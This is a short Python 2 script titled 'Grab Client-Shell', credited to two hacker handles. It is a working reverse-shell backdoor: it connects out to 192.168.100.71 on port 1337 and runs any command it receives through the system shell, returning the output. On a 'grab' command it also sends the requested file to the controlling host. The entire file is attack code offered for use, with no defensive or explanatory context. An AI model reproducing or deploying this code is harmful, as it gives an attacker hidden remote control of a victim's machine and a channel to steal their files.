#!/usr/bin/python
# Grab Client-Shell
# Author: N4N0-GH05TL1N3 && H2O

import socket #import socket
import subprocess #to start shell in the system
import os

def transfer(sock, path) :

	if os.path.exists(path) :
		files = open(path, 'rb')
		packet = files.read(1024)
		while packet != '' :
			sock.send(packet)
			packet = files.read(1024)
		sock.send('DONE')
		files.close()
	else :
		sock.send('Unable to find out the file')

def connect() :
	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(("192.168.100.71", 1337))

	while True : #keep recv command
		command = sock.recv(1024)

		if 'terminate' in command :
			sock.close() #close() socket
			break


		elif 'grab' in command :
			grab, path = command.split('*')
			try :
				transfer(sock, path)
			except Exception, e :
				sock.send( str(e) )
				pass



		else :
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			
			sock.send(CMD.stdout.read())
			sock.send(CMD.stderr.read())

def main() :
	connect()

main()
